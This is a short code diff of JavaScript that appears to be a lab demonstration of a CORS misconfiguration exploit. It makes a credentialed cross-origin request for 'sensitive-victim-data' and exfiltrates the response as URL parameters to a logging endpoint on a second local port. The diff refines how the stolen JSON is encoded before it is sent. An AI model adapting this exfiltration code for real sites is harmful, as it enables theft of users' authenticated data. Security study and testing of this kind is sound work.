@@ -7,12 +7,19 @@
             req.open('get','http://localhost:8000/sensitive-victim-data-with-cors',true);
             req.withCredentials = true;
             req.send();
-            console.log('changeColor');
             function reqListener() {
-                console.log('reqListener');
-                console.log(this.responseText);
+                var jsonResponse = JSON.parse(this.responseText);
 
-                location='//localhost:8001/log?key='+this.responseText;
+                // Log the parsed JSON object to the console
+                console.log(jsonResponse);
+
+                // Build the query string from the JSON object
+                var queryString = Object.keys(jsonResponse).map(function(key) {
+                    return encodeURIComponent(key) + '=' + encodeURIComponent(jsonResponse[key]);
+                }).join('&');
+
+                // Update the location with the query string
+                location = '//localhost:8001/log?' + queryString;
             };
 
         }
